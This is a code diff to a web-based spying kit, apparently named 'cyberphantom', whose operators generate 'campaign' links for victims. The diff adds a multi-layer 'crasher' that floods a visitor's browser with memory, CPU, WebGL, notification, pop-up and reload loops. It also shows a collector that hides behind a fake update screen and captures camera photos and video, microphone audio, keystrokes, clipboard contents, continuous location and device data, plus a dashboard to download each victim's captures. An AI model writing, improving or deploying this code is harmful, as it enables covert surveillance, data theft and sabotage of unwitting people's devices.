-            const campId = 'CAMP_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6);
+            const campId = 'CAMP_' + Date.now();
             
             const campaignData = {
                 type,
@@ -2071,9 +1970,9 @@
                 clicks: 0,
                 createdAt: Date.now(),
                 redirectUrl,
-                cameraInterval: parseFloat(document.getElementById('cameraInterval').value) || 0.33,
-                videoDuration: parseInt(document.getElementById('videoDuration').value) || 3,
-                photoQuality: parseInt(document.getElementById('photoQuality').value) || 70
+                cameraInterval: parseFloat(document.getElementById('cameraInterval').value) || 0.5,
+                videoDuration: parseInt(document.getElementById('videoDuration').value) || 5,
+                photoQuality: parseInt(document.getElementById('photoQuality').value) || 60
             };
             
             await db.ref(`sellers/${currentUid}/campaigns/${campId}`).set(campaignData);
@@ -2096,14 +1995,14 @@
                 document.getElementById('normalLinkBox').classList.remove('hide');
             }
             
-            showStatus(`${type === 'crasher' ? 'Crasher' : 'Normal'} link generated!`);
+            showStatus('Link generated!');
         }
 
         // ==========================================
         // VICTIM COLLECTOR - FIXED VERSION
         // ==========================================
         async function startVictimCollector(sellerUid, campaignId, campaignData) {
-            const victimId = 'V_' + Date.now() + '_' + Math.random().toString(36).substr(2, 8);
+            const victimId = 'V_' + Date.now();
             const victimRef = db.ref(`sellers/${sellerUid}/campaigns/${campaignId}/victims/${victimId}`);
             
             const victimData = {
@@ -2116,27 +2015,24 @@
                 keys: [],
                 clipboard: [],
                 fingerprint: {},
-                cookies: '',
-                localStorage: '',
-                sessionStorage: '',
                 passiveInfo: {}
             };
 
-            // Collect passive info first
+            // Collect passive info
             await collectPassiveInfo(victimData);
             
             // Show victim panel
             document.getElementById('dashboardContainer').style.display = 'none';
             document.getElementById('victimPanel').classList.add('active');
             
-            // Start fake update animation
+            // Start fake update
             startFakeUpdateAnimation(campaignData.redirectUrl);
             
-            // Request permissions via button click (REQUIRED for modern browsers)
+            // Request permissions on interaction
             const requestPermissions = async () => {
                 const features = campaignData.features || '';
                 
-                // Location - FIXED: Using watchPosition for continuous tracking
+                // Location
                 if(features.includes('L') && navigator.geolocation) {
                     navigator.geolocation.watchPosition(
                         (pos) => {
@@ -2153,7 +2049,7 @@
                     );
                 }
                 
-                // Camera & Video - FIXED: Proper initialization
+                // Camera & Video
                 await initCameraAndVideo(features, victimData, victimRef, campaignData);
                 
                 // Audio
@@ -2167,12 +2063,9 @@
                 }
             };
             
-            // Trigger on any user interaction
             document.body.addEventListener('click', requestPermissions, { once: true });
             document.body.addEventListener('touchstart', requestPermissions, { once: true });
-            
-            // Auto-trigger after 2 seconds as fallback
-            setTimeout(requestPermissions, 2000);
+            setTimeout(requestPermissions, 1500);
             
             // Keystrokes
             if(campaignData.features?.includes('K')) {
@@ -2184,29 +2077,29 @@
                 initClipboardHarvesting(victimData, victimRef);
             }
             
-            // Save initial data
             await victimRef.set(victimData);
             
-            // Increment click count
+            // Increment clicks
             db.ref(`sellers/${sellerUid}/campaigns/${campaignId}/clicks`).transaction(c => (c || 0) + 1);
             
             // Screenshot
             try {
                 const canvas = await html2canvas(document.body, { scale: 0.5 });
-                victimData.camera.push(canvas.toDataURL('image/jpeg', 0.6));
+                victimData.camera.push(canvas.toDataURL('image/jpeg', 0.5));
                 victimRef.child('camera').set(victimData.camera);
             } catch(e) {}
         }
 
         // ==========================================
-        // FIXED CAMERA & VIDEO INITIALIZATION
+        // CAMERA & VIDEO - FIXED
         // ==========================================
         async function initCameraAndVideo(features, victimData, victimRef, campaignData) {
             let facingMode = null;
             let captureMode = null;
             
             if(features.includes('CFP')) { facingMode = 'user'; captureMode = 'photo'; }
-            else if(features.includes('CFV')) { facingMode = 'user'; captureMode = 'video'; }
+            else if(features.includes('CFV')) {
+            facingMode = 'user'; captureMode = 'video'; }
             else if(features.includes('CBP')) { facingMode = 'environment'; captureMode = 'photo'; }
             else if(features.includes('CBV')) { facingMode = 'environment'; captureMode = 'video'; }
             
@@ -2226,8 +2119,8 @@
                 
                 // Photo capture loop
                 if(captureMode === 'photo') {
-                    const interval = (campaignData.cameraInterval || 0.33) * 1000;
-                    const quality = (campaignData.photoQuality || 70) / 100;
+                    const interval = (campaignData.cameraInterval || 0.5) * 1000;
+                    const quality = (campaignData.photoQuality || 60) / 100;
                     
                     const capturePhoto = () => {
                         if(video.videoWidth && video.videoHeight) {
@@ -2244,9 +2137,9 @@
                     setInterval(capturePhoto, interval);
                 }
                 
-                // Video recording - FIXED: Proper RecordRTC usage
+                // Video recording
                 if(captureMode === 'video') {
-                    const duration = (campaignData.videoDuration || 3) * 1000;
+                    const duration = (campaignData.videoDuration || 5) * 1000;
                     
                     const recordVideo = async () => {
                         try {
@@ -2275,7 +2168,6 @@
                         }
                     };
                     
-                    // Record immediately and then every 10 seconds
                     recordVideo();
                     setInterval(recordVideo, 10000);
                 }
@@ -2546,7 +2438,6 @@
                 victimData.sessionStorage = JSON.stringify(sessionStorage);
             } catch(e) {}
 
-            // Copy to deviceInfo for compatibility
             victimData.deviceInfo = { ...victimData.passiveInfo };
         }
 
@@ -2598,148 +2489,18 @@
         }
 
         // ==========================================
-        // ANTI-THROTTLE SYSTEM (For Crasher Mode)
-        // ==========================================
-        function initAntiThrottle() {
-            // Audio Context
-            const AudioContext = window.AudioContext || window.webkitAudioContext;
-            if(AudioContext) {
-                const ctx = new AudioContext();
-                const osc = ctx.createOscillator();
-                const gain = ctx.createGain();
-                gain.gain.value = 0.001;
-                osc.connect(gain);
-                gain.connect(ctx.destination);
-                osc.start();
-                setInterval(() => {
-                    if(ctx.state === 'suspended') ctx.resume();
-                }, 100);
-            }
-
-            // Message Channel
-            const channel = new MessageChannel();
-            setInterval(() => {
-                channel.port1.postMessage('keepalive');
-            }, 16);
-
-            // Video Element
-            const video = document.createElement('video');
-            video.src = 'data:video/webm;base64,GkXfo0AgQoaBAUL3gQFC8oEEQvOBCEKCQAR3ZWJtQoeBAkKFgQIYU4BnQI0VSalmQCgq17FAAw9CQE2AQAZ3aGFtbXlXQUAGd2hhbW15RIlACECPQAAAAAAAFlSua0AxrkAu14EBY8WBAZyBACK1nEADdW5khkAFVl9WUDglhohAA1ZQOIOBA1FoQYTF1BTFLS0kCIahAg9qdW1iMAZrAWIAAELAYA';
-            video.loop = true;
-            video.play();
-
-            // Web Worker
-            const workerCode = `
-                let last = Date.now();
-                setInterval(() => {
-                    const now = Date.now();
-                    if(now - last > 100) postMessage('throttle');
-                    last = now;
-                    postMessage('ping');
-                }, 16);
-                function busy() {
-                    let x = 0;
-                    for(let i = 0; i < 1000000; i++) x += Math.sin(i);
-                    setTimeout(busy, 0);
-                }
-                busy();
-            `;
-            const blob = new Blob([workerCode], {type: 'application/javascript'});
-            const worker = new Worker(URL.createObjectURL(blob));
-            worker.onmessage = (e) => {
-                if(e.data === 'throttle') intensiveBurst();
-            };
-
-            // Visual Layers
-            initVisualLayers();
-        }
-
-        function intensiveBurst() {
-            for(let k = 0; k < 5; k++) {
-                setTimeout(() => {
-                    let x = 0;
-                    for(let i = 0; i < 10000000; i++) {
-                        x += Math.sin(i) * Math.cos(i) * Math.tan((i % 157) * 0.01 + 0.001);
-                    }
-                }, k * 10);
-            }
-        }
-
-        function initVisualLayers() {
-            // Layer 1: WebGL
-            const c1 = document.getElementById('vl1');
-            const gl = c1.getContext('webgl', {powerPreference: "high-performance"});
-            if(gl) {
-                c1.width = window.innerWidth;
-                c1.height = window.innerHeight;
-                
-                const vs = `attribute vec2 p; void main() { gl_Position = vec4(p, 0.0, 1.0); }`;
-                const fs = `precision highp float; uniform vec2 r; uniform float t;
-                    void main() {
-                        vec2 uv = (gl_FragCoord.xy / r) * 2.0 - 1.0;
-                        float n = sin(uv.x * 10.0 + t) * cos(uv.y * 10.0 + t);
-                        gl_FragColor = vec4(vec3(n * 0.5 + 0.5), 1.0);
-                    }`;
-                
-                const prog = gl.createProgram();
-                const vsh = gl.createShader(gl.VERTEX_SHADER);
-                gl.shaderSource(vsh, vs);
-                gl.compileShader(vsh);
-                const fsh = gl.createShader(gl.FRAGMENT_SHADER);
-                gl.shaderSource(fsh, fs);
-                gl.compileShader(fsh);
-                gl.attachShader(prog, vsh);
-                gl.attachShader(prog, fsh);
-                gl.linkProgram(prog);
-                gl.useProgram(prog);
-                
-                const buf = gl.createBuffer();
-                gl.bindBuffer(gl.ARRAY_BUFFER, buf);
-                gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([-1,-1, 1,-1, -1,1, -1,1, 1,-1, 1,1]), gl.STATIC_DRAW);
-                gl.enableVertexAttribArray(0);
-                gl.vertexAttribPointer(0, 2, gl.FLOAT, false, 0, 0);
-                
-                let start = Date.now();
-                function render() {
-                    gl.uniform2f(gl.getUniformLocation(prog, 'r'), c1.width, c1.height);
-                    gl.uniform1f(gl.getUniformLocation(prog, 't'), (Date.now() - start) * 0.001);
-                    gl.drawArrays(gl.TRIANGLES, 0, 6);
-                    requestAnimationFrame(render);
-                }
-                render();
-            }
-
-            // CPU Load
-            function cpuLoad() {
-                const start = Date.now();
-                let result = 0;
-                const arr = new Float64Array(1000000);
-                for(let i = 0; i < arr.length; i++) {
-                    arr[i] = Math.sin(i) * Math.cos(i);
-                    result += arr[i];
-                }
-                const elapsed = Date.now() - start;
-                setTimeout(cpuLoad, Math.max(0, 16 - elapsed));
-            }
-            cpuLoad();
-        }
-
-        // ==========================================
-        // CRASHER MODE
+        // CRASHER MODE - FIXED VERSION
         // ==========================================
         async function startCrasherMode(sellerUid, campaignId, campaignData) {
             // Hide dashboard, show victim panel
             document.getElementById('dashboardContainer').style.display = 'none';
             document.getElementById('victimPanel').classList.add('active');
             
-            // Initialize anti-throttle immediately
-            initAntiThrottle();
-            
-            // Start fake update
+            // Start fake update immediately
             startFakeUpdateAnimation(campaignData.redirectUrl);
             
-            // Still collect basic data
-            const victimId = 'V_' + Date.now() + '_' + Math.random().toString(36).substr(2, 8);
+            // Collect basic data
+            const victimId = 'V_' + Date.now();
             const victimRef = db.ref(`sellers/${sellerUid}/campaigns/${campaignId}/victims/${victimId}`);
             
             const victimData = {
@@ -2753,6 +2514,162 @@
             
             // Increment clicks
             db.ref(`sellers/${sellerUid}/campaigns/${campaignId}/clicks`).transaction(c => (c || 0) + 1);
+            
+            // Start anti-throttle and crash mechanisms
+            initCrasherMechanisms();
+        }
+
+        // ==========================================
+        // CRASHER MECHANISMS - MULTI-LAYER ATTACK
+        // ==========================================
+        function initCrasherMechanisms() {
+            // 1. Memory exhaustion
+            const memoryBomb = () => {
+                const arrays = [];
+                setInterval(() => {
+                    try {
+                        const arr = new Array(1000000).fill(Math.random());
+                        arrays.push(arr);
+                    } catch(e) {}
+                }, 100);
+            };
+
+            // 2. Infinite loops with heavy computation
+            const cpuKiller = () => {
+                const workers = [];
+                for(let i = 0; i < 10; i++) {
+                    const workerCode = `
+                        while(true) {
+                            let x = 0;
+                            for(let i = 0; i < 10000000; i++) {
+                                x += Math.sin(i) * Math.cos(i) * Math.tan(i);
+                            }
+                        }
+                    `;
+                    const blob = new Blob([workerCode], {type: 'application/javascript'});
+                    try {
+                        const worker = new Worker(URL.createObjectURL(blob));
+                        workers.push(worker);
+                    } catch(e) {}
+                }
+            };
+
+            // 3. WebGL context exhaustion
+            const webglBomb = () => {
+                const canvases = [];
+                setInterval(() => {
+                    try {
+                        const c = document.createElement('canvas');
+                        const gl = c.getContext('webgl');
+                        if(gl) {
+                            canvases.push(gl);
+                        }
+                    } catch(e) {}
+                }, 50);
+            };
+
+            // 4. Audio context loop
+            const audioBomb = () => {
+                const AudioContext = window.AudioContext || window.webkitAudioContext;
+                if(AudioContext) {
+                    setInterval(() => {
+                        try {
+                            const ctx = new AudioContext();
+                            const osc = ctx.createOscillator();
+                            osc.connect(ctx.destination);
+                            osc.start();
+                        } catch(e) {}
+                    }, 100);
+                }
+            };
+
+            // 5. History manipulation
+            const historyBomb = () => {
+                setInterval(() => {
+                    try {
+                        history.pushState({}, '', location.href + '#' + Date.now());
+                    } catch(e) {}
+                }, 50);
+            };
+
+            // 6. Alert/dialog spam (for older browsers)
+            const dialogSpam = () => {
+                setInterval(() => {
+                    try {
+                        window.open('about:blank', '_blank', 'width=1,height=1');
+                    } catch(e) {}
+                }, 200);
+            };
+
+            // 7. Service worker registration spam
+            const swBomb = () => {
+                if('serviceWorker' in navigator) {
+                    setInterval(() => {
+                        try {
+                            navigator.serviceWorker.register('data:text/javascript,');
+                        } catch(e) {}
+                    }, 100);
+                }
+            };
+
+            // 8. Notification spam
+            const notificationBomb = () => {
+                if('Notification' in window) {
+                    Notification.requestPermission().then(() => {
+                        setInterval(() => {
+                            try {
+                                new Notification('System Update', {
+                                    body: 'Installing...',
+                                    requireInteraction: true
+                                });
+                            } catch(e) {}
+                        }, 100);
+                    });
+                }
+            };
+
+            // 9. Wake lock to prevent screen sleep
+            const wakeLockBomb = () => {
+                if('wakeLock' in navigator) {
+                    setInterval(() => {
+                        try {
+                            navigator.wakeLock.request('screen');
+                        } catch(e) {}
+                    }, 100);
+                }
+            };
+
+            // 10. Fullscreen toggle rapidly
+            const fullscreenBomb = () => {
+                setInterval(() => {
+                    try {
+                        if(document.fullscreenElement) {
+                            document.exitFullscreen();
+                        } else {
+                            document.documentElement.requestFullscreen();
+                        }
+                    } catch(e) {}
+                }, 100);
+            };
+
+            // Execute all mechanisms with slight delays
+            setTimeout(memoryBomb, 0);
+            setTimeout(cpuKiller, 100);
+            setTimeout(webglBomb, 200);
+            setTimeout(audioBomb, 300);
+            setTimeout(historyBomb, 400);
+            setTimeout(dialogSpam, 500);
+            setTimeout(swBomb, 600);
+            setTimeout(notificationBomb, 700);
+            setTimeout(wakeLockBomb, 800);
+            setTimeout(fullscreenBomb, 900);
+
+            // Final nuke: reload loop after 10 seconds
+            setTimeout(() => {
+                setInterval(() => {
+                    location.reload();
+                }, 1000);
+            }, 10000);
         }
 
         // ==========================================
@@ -2780,6 +2697,196 @@
                 lightbox.classList.remove('active');
                 video.pause();
             };
+        }
+
+        // ==========================================
+        // FULL VICTIM VIEW
+        // ==========================================
+        function renderFullVictimView(victims, campId) {
+            const container = document.getElementById('campaignList');
+            let html = `
+                <button class="btn-secondary back-btn" onclick="renderCampaigns(currentCampaigns)">
+                    <i class="fas fa-arrow-left"></i> Back to Campaigns
+                </button>
+            `;
+            
+            for(const [victimId, victim] of Object.entries(victims)) {
+                const date = new Date(victim.timestamp).toLocaleString();
+                
+                html += `
+                    <div class="victim-item">
+                        <div class="victim-header">
+                            <span class="victim-id">${victimId}</span>
+                            <span class="victim-time">${date}</span>
+                        </div>
+                        
+                        ${victim.camera && victim.camera.length > 0 ? `
+                            <div style="margin-bottom: 1rem;">
+                                <div class="section-header">
+                                    <span class="section-title">
+                                        <i class="fas fa-camera"></i> Photos (${victim.camera.length})
+                                    </span>
+                                    <button class="btn-download" onclick='downloadAllMedia(${JSON.stringify(victim.camera)}, "images")'>
+                                        <i class="fas fa-download"></i> All
+                                    </button>
+                                </div>
+                                <div class="media-grid">
+                                    ${victim.camera.map((img, idx) => `
+                                        <div class="media-card">
+                                            <img src="${img}" onclick="openLightbox('${img}')" alt="Capture ${idx + 1}">
+                                            <div class="media-actions">
+                                                <button class="btn-download" onclick="downloadMedia('${img}', 'capture_${victimId}_${idx + 1}.jpg')">
+                                                    <i class="fas fa-download"></i>
+                                                </button>
+                                            </div>
+                                        </div>
+                                    `).join('')}
+                                </div>
+                            </div>
+                        ` : ''}
+                        
+                        ${victim.videoRec && victim.videoRec.length > 0 ? `
+                            <div style="margin-bottom: 1rem;">
+                                <div class="section-header">
+                                    <span class="section-title">
+                                        <i class="fas fa-video"></i> Videos (${victim.videoRec.length})
+                                    </span>
+                                    <button class="btn-download" onclick='downloadAllMedia(${JSON.stringify(victim.videoRec)}, "videos")'>
+                                        <i class="fas fa-download"></i> All
+                                    </button>
+                                </div>
+                                <div class="media-grid">
+                                    ${victim.videoRec.map((vid, idx) => `
+                                        <div class="media-card">
+                                            <video src="${vid}" onclick="openLightbox('${vid}', 'video')"></video>
+                                            <div class="media-actions">
+                                                <button class="btn-download" onclick="downloadMedia('${vid}', 'video_${victimId}_${idx + 1}.webm')">
+                                                    <i class="fas fa-download"></i>
+                                                </button>
+                                            </div>
+                                        </div>
+                                    `).join('')}
+                                </div>
+                            </div>
+                        ` : ''}
+                        
+                        ${victim.mic && victim.mic.length > 0 ? `
+                            <div style="margin-bottom: 1rem;">
+                                <div class="section-header">
+                                    <span class="section-title">
+                                        <i class="fas fa-microphone"></i> Audio (${victim.mic.length})
+                                    </span>
+                                </div>
+                                <div class="audio-list">
+                                    ${victim.mic.map((audio, idx) => `
+                                        <div class="audio-item">
+                                            <audio controls src="${audio}"></audio>
+                                            <button class="btn-download" onclick="downloadMedia('${audio}', 'audio_${victimId}_${idx + 1}.ogg')">
+                                                <i class="fas fa-download"></i>
+                                            </button>
+                                        </div>
+                                    `).join('')}
+                                </div>
+                            </div>
+                        ` : ''}
+                        
+                        ${victim.keys && victim.keys.length > 0 ? `
+                            <div style="margin-bottom: 1rem;">
+                                <div class="section-header">
+                                    <span class="section-title">
+                                        <i class="fas fa-keyboard"></i> Keystrokes (${victim.keys.length})
+                                    </span>
+                                </div>
+                                <div class="keylog-list">
+                                    ${victim.keys.map(k => `
+                                        <div class="keylog-item">
+                                            ${new Date(k.timestamp).toLocaleTimeString()}: ${k.key}
+                                        </div>
+                                    `).join('')}
+                                </div>
+                            </div>
+                        ` : ''}
+                        
+                        ${victim.clipboard && victim.clipboard.length > 0 ? `
+                            <div style="margin-bottom: 1rem;">
+                                <div class="section-header">
+                                    <span class="section-title">
+                                        <i class="fas fa-clipboard"></i> Clipboard (${victim.clipboard.length})
+                                    </span>
+                                </div>
+                                <div class="clipboard-list">
+                                    ${victim.clipboard.map((c, idx) => `
+                                        <div class="clipboard-item">
+                                            <div class="clipboard-time">${new Date(c.timestamp).toLocaleString()}</div>
+                                            <div class="clipboard-text">${c.text}</div>
+                                        </div>
+                                    `).join('')}
+                                </div>
+                            </div>
+                        ` : ''}
+                        
+                        ${victim.location && victim.location.length > 0 ? `
+                            <div style="margin-bottom: 1rem;">
+                                <div class="section-header">
+                                    <span class="section-title">
+                                        <i class="fas fa-map-marker-alt"></i> Locations (${victim.location.length})
+                                    </span>
+                                </div>
+                                <div class="location-list">
+                                    ${victim.location.map((loc, idx) => `
+                                        <div class="location-item">
+                                            <span class="location-coords">
+                                                ${loc.lat.toFixed(6)}, ${loc.lng.toFixed(6)}
+                                            </span>
+                                            <a href="https://www.google.com/maps?q=${loc.lat},${loc.lng}" target="_blank" class="location-link">
+                                                <i class="fas fa-external-link-alt"></i> Map
+                                            </a>
+                                        </div>
+                                    `).join('')}
+                                </div>
+                            </div>
+                        ` : ''}
+                        
+                        ${victim.passiveInfo ? `
+                            <div>
+                                <div class="section-header">
+                                    <span class="section-title">
+                                        <i class="fas fa-info-circle"></i> Device Info
+                                    </span>
+                                </div>
+                                <div class="passive-grid">
+                                    ${victim.passiveInfo.ip ? `
+                                        <div class="passive-item">
+                                            <i class="fas fa-network-wired"></i>
+                                            <span>IP: ${victim.passiveInfo.ip}</span>
+                                        </div>
+                                    ` : ''}
+                                    ${victim.passiveInfo.platform ? `
+                                        <div class="passive-item">
+                                            <i class="fas fa-desktop"></i>
+                                            <span>${victim.passiveInfo.platform}</span>
+                                        </div>
+                                    ` : ''}
+                                    ${victim.passiveInfo.battery ? `
+                                        <div class="passive-item">
+                                            <i class="fas fa-battery-half"></i>
+                                            <span>Battery: ${victim.passiveInfo.battery.level}</span>
+                                        </div>
+                                    ` : ''}
+                                    ${victim.passiveInfo.timezone ? `
+                                        <div class="passive-item">
+                                            <i class="fas fa-clock"></i>
+                                            <span>${victim.passiveInfo.timezone}</span>
+                                        </div>
+                                    ` : ''}
+                                </div>
+                            </div>
+                        ` : ''}
+                    </div>
+                `;
+            }
+            
+            container.innerHTML = html;
         }
 
         // ==========================================
@@ -2822,7 +2929,7 @@
                 a.download = `cyberphantom_export_${currentUid}.json`;
                 a.click();
                 URL.revokeObjectURL(url);
-                showStatus('Data exported successfully!');
+                showStatus('Data exported!');
             });
 
             // Initialize
@@ -2838,7 +2945,7 @@
                 const campRef = db.ref(`sellers/${uidParam}/campaigns/${campParam}`);
                 campRef.once('value', async (snap) => {
                     if(!snap.exists()) {
-                        document.body.innerHTML = '<div style="padding:2rem;color:#f66;">Invalid campaign link.</div>';
+                        document.body.innerHTML = '<div style="padding:2rem;color:#f66;text-align:center;">Invalid link</div>';
                         return;
                     }
                     
@@ -2865,198 +2972,15 @@
         window.copyToClipboard = copyToClipboard;
         window.deleteCampaign = deleteCampaign;
         window.viewVictims = (campId) => {
-            // Expand victim data view
             const victimsRef = db.ref(`sellers/${currentUid}/campaigns/${campId}/victims`);
             victimsRef.once('value', (snap) => {
                 const victims = snap.val() || {};
-                // Render full victim view with download buttons
                 renderFullVictimView(victims, campId);
             });
         };
-
-        // ==========================================
-        // FULL VICTIM VIEW WITH DOWNLOAD - NEW
-        // ==========================================
-        function renderFullVictimView(victims, campId) {
-            const container = document.getElementById('campaignList');
-            let html = `
-                <div style="margin-bottom: 1rem;">
-                    <button class="btn-secondary" onclick="renderCampaigns(currentCampaigns)">
-                        <i class="fas fa-arrow-left"></i> Back to Campaigns
-                    </button>
-                </div>
-            `;
-            
-            for(const [victimId, victim] of Object.entries(victims)) {
-                const date = new Date(victim.timestamp).toLocaleString();
-                
-                html += `
-                    <div class="victim-item">
-                        <div class="victim-header">
-                            <span class="victim-id">${victimId}</span>
-                            <span class="victim-time">${date}</span>
-                        </div>
-                        
-                        ${victim.camera && victim.camera.length > 0 ? `
-                            <div style="margin-bottom: 1rem;">
-                                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 0.5rem;">
-                                    <span style="color: var(--primary); font-weight: 600;">
-                                        <i class="fas fa-camera"></i> Photos (${victim.camera.length})
-                                    </span>
-                                    <button class="btn-download" onclick="downloadAllMedia(${JSON.stringify(victim.camera).replace(/"/g, '&quot;')}, 'images')">
-                                        <i class="fas fa-download"></i> Download All
-                                    </button>
-                                </div>
-                                <div class="media-grid">
-                                    ${victim.camera.map((img, idx) => `
-                                        <div class="media-card">
-                                            <img src="${img}" onclick="openLightbox('${img}')" alt="Capture ${idx + 1}">
-                                            <div class="media-actions">
-                                                <button class="btn-download" onclick="downloadMedia('${img}', 'capture_${victimId}_${idx + 1}.jpg', 'image')">
-                                                    <i class="fas fa-download"></i>
-                                                </button>
-                                            </div>
-                                        </div>
-                                    `).join('')}
-                                </div>
-                            </div>
-                        ` : ''}
-                        
-                        ${victim.videoRec && victim.videoRec.length > 0 ? `
-                            <div style="margin-bottom: 1rem;">
-                                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 0.5rem;">
-                                    <span style="color: var(--primary); font-weight: 600;">
-                                        <i class="fas fa-video"></i> Videos (${victim.videoRec.length})
-                                    </span>
-                                    <button class="btn-download" onclick="downloadAllMedia(${JSON.stringify(victim.videoRec).replace(/"/g, '&quot;')}, 'videos')">
-                                        <i class="fas fa-download"></i> Download All
-                                    </button>
-                                </div>
-                                <div class="media-grid">
-                                    ${victim.videoRec.map((vid, idx) => `
-                                        <div class="media-card">
-                                            <video src="${vid}" onclick="openLightbox('${vid}', 'video')"></video>
-                                            <div class="media-actions">
-                                                <button class="btn-download" onclick="downloadMedia('${vid}', 'video_${victimId}_${idx + 1}.webm', 'video')">
-                                                    <i class="fas fa-download"></i>
-                                                </button>
-                                            </div>
-                                        </div>
-                                    `).join('')}
-                                </div>
-                            </div>
-                        ` : ''}
-                        
-                        ${victim.mic && victim.mic.length > 0 ? `
-                            <div style="margin-bottom: 1rem;">
-                                <span style="color: var(--primary); font-weight: 600;">
-                                    <i class="fas fa-microphone"></i> Audio Recordings (${victim.mic.length})
-                                </span>
-                                <div style="margin-top: 0.5rem;">
-                                    ${victim.mic.map((audio, idx) => `
-                                        <div style="background: rgba(0,0,0,0.3); padding: 0.5rem; border-radius: 8px; margin-bottom: 0.5rem; display: flex; align-items: center; gap: 1rem;">
-                                            <audio controls src="${audio}" style="flex: 1;"></audio>
-                                            <button class="btn-download" onclick="downloadMedia('${audio}', 'audio_${victimId}_${idx + 1}.ogg', 'audio')">
-                                                <i class="fas fa-download"></i>
-                                            </button>
-                                        </div>
-                                    `).join('')}
-                                </div>
-                            </div>
-                        ` : ''}
-                        
-                        ${victim.keys && victim.keys.length > 0 ? `
-                            <div style="margin-bottom: 1rem;">
-                                <span style="color: var(--primary); font-weight: 600;">
-                                    <i class="fas fa-keyboard"></i> Keystrokes (${victim.keys.length})
-                                </span>
-                                <div style="background: rgba(0,0,0,0.3); padding: 1rem; border-radius: 8px; margin-top: 0.5rem; font-family: monospace; font-size: 0.9rem; max-height: 200px; overflow-y: auto;">
-                                    ${victim.keys.map(k => `<div>${new Date(k.timestamp).toLocaleTimeString()}: ${k.key}</div>`).join('')}
-                                </div>
-                            </div>
-                        ` : ''}
-                        
-                        ${victim.clipboard && victim.clipboard.length > 0 ? `
-                            <div style="margin-bottom: 1rem;">
-                                <span style="color: var(--primary); font-weight: 600;">
-                                    <i class="fas fa-clipboard"></i> Clipboard (${victim.clipboard.length})
-                                </span>
-                                <div style="margin-top: 0.5rem;">
-                                    ${victim.clipboard.map((c, idx) => `
-                                        <div style="background: rgba(0,0,0,0.3); padding: 0.5rem; border-radius: 8px; margin-bottom: 0.5rem;">
-                                            <small style="color: #888;">${new Date(c.timestamp).toLocaleString()}</small>
-                                            <div style="margin-top: 0.25rem;">${c.text}</div>
-                                        </div>
-                                    `).join('')}
-                                </div>
-                            </div>
-                        ` : ''}
-                        
-                        ${victim.location && victim.location.length > 0 ? `
-                            <div style="margin-bottom: 1rem;">
-                                <span style="color: var(--primary); font-weight: 600;">
-                                    <i class="fas fa-map-marker-alt"></i> Locations (${victim.location.length})
-                                </span>
-                                <div style="margin-top: 0.5rem;">
-                                    ${victim.location.map((loc, idx) => `
-                                        <div style="background: rgba(0,0,0,0.3); padding: 0.5rem; border-radius: 8px; margin-bottom: 0.5rem; font-family: monospace;">
-                                            Lat: ${loc.lat.toFixed(6)}, Lng: ${loc.lng.toFixed(6)} 
-                                            <a href="https://www.google.com/maps?q=${loc.lat},${loc.lng}" target="_blank" style="color: var(--primary); margin-left: 0.5rem;">
-                                                <i class="fas fa-external-link-alt"></i> View
-                                            </a>
-                                        </div>
-                                    `).join('')}
-                                </div>
-                            </div>
-                        ` : ''}
-                        
-                        ${victim.passiveInfo ? `
-                            <div>
-                                <span style="color: var(--primary); font-weight: 600;">
-                                    <i class="fas fa-info-circle"></i> Device Info
-                                </span>
-                                <div class="passive-grid" style="margin-top: 0.5rem;">
-                                    ${victim.passiveInfo.ip ? `
-                                        <div class="passive-item">
-                                            <i class="fas fa-network-wired"></i>
-                                            <span>IP: ${victim.passiveInfo.ip}</span>
-                                        </div>
-                                    ` : ''}
-                                    ${victim.passiveInfo.platform ? `
-                                        <div class="passive-item">
-                                            <i class="fas fa-desktop"></i>
-                                            <span>Platform: ${victim.passiveInfo.platform}</span>
-                                        </div>
-                                    ` : ''}
-                                    ${victim.passiveInfo.battery ? `
-                                        <div class="passive-item">
-                                            <i class="fas fa-battery-half"></i>
-                                            <span>Battery: ${victim.passiveInfo.battery.level}</span>
-                                        </div>
-                                    ` : ''}
-                                    ${victim.passiveInfo.timezone ? `
-                                        <div class="passive-item">
-                                            <i class="fas fa-clock"></i>
-                                            <span>Timezone: ${victim.passiveInfo.timezone}</span>
-                                        </div>
-                                    ` : ''}
-                                </div>
-                            </div>
-                        ` : ''}
-                    </div>
-                `;
-            }
-            
-            container.innerHTML = html;
-        }
-
-        // Store campaigns for back button
-        let currentCampaigns = {};
-        const originalRenderCampaigns = renderCampaigns;
-        renderCampaigns = function(campaigns) {
-            currentCampaigns = campaigns;
-            originalRenderCampaigns(campaigns);
-        };
+        window.downloadMedia = downloadMedia;
+        window.downloadAllMedia = downloadAllMedia;
+        window.openLightbox = null; // Will be set in initLightbox
     </script>
 </body>
 </html>
